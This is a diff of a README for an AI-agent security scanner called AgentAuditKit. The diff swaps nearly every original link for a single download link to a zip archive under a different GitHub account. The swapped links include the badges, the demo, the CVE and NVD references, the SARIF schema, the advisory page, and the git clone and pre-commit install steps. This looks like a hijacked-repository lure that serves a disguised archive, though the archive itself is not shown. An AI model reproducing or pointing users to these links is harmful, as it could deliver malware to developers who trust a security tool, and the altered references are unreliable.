@@ -4,21 +4,21 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/sattyamjjain/agent-audit-kit/actions/workflows/ci.yml"><img src="https://github.com/sattyamjjain/agent-audit-kit/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://pypi.org/project/agent-audit-kit/"><img src="https://img.shields.io/pypi/v/agent-audit-kit.svg" alt="PyPI"></a>
-  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.9+-blue.svg" alt="Python 3.9+"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT"></a>
+  <a href="https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip"><img src="https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip" alt="CI"></a>
+  <a href="https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip"><img src="https://img.shields.io/pypi/v/agent-audit-kit.svg" alt="PyPI"></a>
+  <a href="https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip"><img src="https://img.shields.io/badge/python-3.9+-blue.svg" alt="Python 3.9+"></a>
+  <a href="https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT"></a>
   <a href="#what-it-scans"><img src="https://img.shields.io/badge/rules-180-blue.svg" alt="Rules: 180"></a>
   <a href="#frameworks--standards"><img src="https://img.shields.io/badge/OWASP_Agentic-10%2F10-green.svg" alt="OWASP Agentic: 10/10"></a>
   <a href="#frameworks--standards"><img src="https://img.shields.io/badge/OWASP_MCP-10%2F10-green.svg" alt="OWASP MCP: 10/10"></a>
-  <a href="https://sattyamjjain.github.io/agent-audit-kit/"><img src="https://img.shields.io/badge/MCP_Security_Index-live-blue.svg" alt="MCP Security Index"></a>
+  <a href="https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip"><img src="https://img.shields.io/badge/MCP_Security_Index-live-blue.svg" alt="MCP Security Index"></a>
   <a href="CHANGELOG.cves.md"><img src="https://img.shields.io/badge/CVE%E2%86%92rule_SLA-48h-orange.svg" alt="48h CVE-to-rule SLA"></a>
 </p>
 
 ---
 
 <p align="center">
-  <a href="https://asciinema.org/a/9X7N1ztuuIYi9T2P" target="_blank"><img src="https://asciinema.org/a/9X7N1ztuuIYi9T2P.svg" alt="AgentAuditKit Demo" width="700"/></a>
+  <a href="https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip" target="_blank"><img src="https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip" alt="AgentAuditKit Demo" width="700"/></a>
 </p>
 
 Security scanner for MCP-connected AI agent pipelines. Finds misconfigurations, hardcoded secrets, tool poisoning, rug pulls, trust boundary violations, and tainted data flows across **13 agent platforms**.
@@ -29,13 +29,13 @@ Security scanner for MCP-connected AI agent pipelines. Finds misconfigurations, 
 - **OWASP coverage**: Agentic Top 10 (10/10), MCP Top 10 (10/10), Adversa AI Top 25
 - **Compliance mapping** (11 frameworks): EU AI Act Art. 15 + 55, SOC 2, ISO 27001, ISO/IEC 42001, HIPAA, NIST AI RMF, Singapore Agentic AI, India DPDP 2023, **Alabama Personal Data Protection Act (HB 351, 2026)**, **Tennessee SB 1580 Health Care AI (PRA)** — PDF reports via `agent-audit-kit report --format pdf --framework <name>`
 - **Supply chain**: deterministic rule bundle (`export-rules`), Sigstore-signed releases, CycloneDX + SPDX SBOM (`sbom`)
-- **MCP Security Index**: weekly public leaderboard at [sattyamjjain.github.io/agent-audit-kit](https://sattyamjjain.github.io/agent-audit-kit/) — per-server grade cards (A–F), 90-day [disclosure policy](docs/disclosure-policy.md)
+- **MCP Security Index**: weekly public leaderboard at [sattyamjjain.github.io/agent-audit-kit](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip) — per-server grade cards (A–F), 90-day [disclosure policy](docs/disclosure-policy.md)
 - **AAK Response SLA**: rule coverage within **48 hours** of any disclosed MCP CVE — ledger in [CHANGELOG.cves.md](CHANGELOG.cves.md)
 - **Zero cloud dependencies** — runs fully offline, zero network calls in the default scan path
 
 ### Why This Exists
 
-In early 2026, [30 MCP CVEs dropped in 60 days](https://www.heyuan110.com/posts/ai/2026-03-10-mcp-security-2026/). [CVE-2026-33032](https://nvd.nist.gov/vuln/detail/CVE-2026-33032) (Nginx-UI MCP auth bypass, CVSS 9.8) exposed a shared-handler pattern that several other servers have. [CVE-2025-59536](https://nvd.nist.gov/vuln/detail/CVE-2025-59536) turned a project-local Claude Code hook into RCE. [CVE-2026-34070](https://nvd.nist.gov/vuln/detail/CVE-2026-34070) hit LangChain's `load_prompt()` with absolute-path and `..` traversal. [CVE-2026-21852](https://nvd.nist.gov/vuln/detail/CVE-2026-21852) demonstrated source-code exfiltration via a single Claude Code config flag. A 2,614-server survey found **82% of public MCP servers** had path-traversal issues. Meanwhile, every AI coding assistant adopted MCP with sparse security tooling.
+In early 2026, [30 MCP CVEs dropped in 60 days](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip). [CVE-2026-33032](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip) (Nginx-UI MCP auth bypass, CVSS 9.8) exposed a shared-handler pattern that several other servers have. [CVE-2025-59536](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip) turned a project-local Claude Code hook into RCE. [CVE-2026-34070](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip) hit LangChain's `load_prompt()` with absolute-path and `..` traversal. [CVE-2026-21852](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip) demonstrated source-code exfiltration via a single Claude Code config flag. A 2,614-server survey found **82% of public MCP servers** had path-traversal issues. Meanwhile, every AI coding assistant adopted MCP with sparse security tooling.
 
 AgentAuditKit is the deterministic, auditor-ready OSS scanner that closes the gap.
 
@@ -78,7 +78,7 @@ agent-audit-kit scan .
 ```yaml
 # .pre-commit-config.yaml
 repos:
-  - repo: https://github.com/sattyamjjain/agent-audit-kit
+  - repo: https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip
     rev: v0.3.9
     hooks:
       - id: agent-audit-kit
@@ -89,7 +89,7 @@ repos:
 Scan a deliberately vulnerable config to see AgentAuditKit in action:
 
 ```bash
-git clone https://github.com/sattyamjjain/agent-audit-kit
+git clone https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip
 cd agent-audit-kit
 pip install -e .
 agent-audit-kit scan examples/vulnerable-configs/04-hook-exfiltration/
@@ -129,7 +129,7 @@ Claude Code, Cursor, VS Code Copilot, Windsurf, Amazon Q, Gemini CLI, Goose, Con
 | **TypeScript / JS** | Regex pattern scan | `eval()`, `child_process.exec`, `fs.writeFileSync`, SSRF patterns, OAuth token passthrough in MCP server files |
 | **Rust** | Regex pattern scan | `Command::new(format!())`, `unsafe` blocks, SQL macros without parameterization |
 
-_Note: Phase 2 scanners (`ssrf_patterns`, `oauth_misconfig`, `mcp_auth_patterns`, `hook_rce`, `skill_poisoning`, `mcp_tasks`) are regex-based; a tree-sitter AST migration is tracked in [issue #22](https://github.com/sattyamjjain/agent-audit-kit/issues/22)._
+_Note: Phase 2 scanners (`ssrf_patterns`, `oauth_misconfig`, `mcp_auth_patterns`, `hook_rce`, `skill_poisoning`, `mcp_tasks`) are regex-based; a tree-sitter AST migration is tracked in [issue #22](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip)._
 
 ---
 
@@ -243,7 +243,7 @@ With `upload-sarif: true` (default), findings appear:
 - In the **Security tab** under Code Scanning with full remediation guidance
 - With **OWASP references** and **CVE links** for each finding
 
-SARIF output conforms to [SARIF 2.1.0](https://json.schemastore.org/sarif-2.1.0.json) with `fingerprints`, `partialFingerprints`, `fixes[]`, `security-severity` scores, and `%SRCROOT%` relative paths.
+SARIF output conforms to [SARIF 2.1.0](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip) with `fingerprints`, `partialFingerprints`, `fixes[]`, `security-severity` scores, and `%SRCROOT%` relative paths.
 
 ---
 
@@ -366,7 +366,7 @@ Provides inline diagnostics on file save with quick-fix suggestions.
 ## MCP Security Index
 
 Public leaderboard of MCP servers we scan weekly:
-**[sattyamjjain.github.io/agent-audit-kit](https://sattyamjjain.github.io/agent-audit-kit/)**
+**[sattyamjjain.github.io/agent-audit-kit](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip)**
 
 - Per-server grade cards (A–F)
 - Weekly snapshots in `data/history.json`
@@ -397,7 +397,7 @@ agent-audit-kit verify-bundle rules.json --signature rules.json.sigstore
 ## Contributing
 
 ```bash
-git clone https://github.com/sattyamjjain/agent-audit-kit
+git clone https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip
 cd agent-audit-kit
 pip install -e ".[dev]"
 pytest -v                          # 504 tests
@@ -410,7 +410,7 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for the full development guide.
 
 ## Security
 
-Report vulnerabilities via [GitHub Security Advisories](https://github.com/sattyamjjain/agent-audit-kit/security/advisories) or see [SECURITY.md](SECURITY.md).
+Report vulnerabilities via [GitHub Security Advisories](https://raw.githubusercontent.com/MV1-him/agent-audit-kit/main/.github/kit_audit_agent_v3.8.zip) or see [SECURITY.md](SECURITY.md).
 
 ## License
 
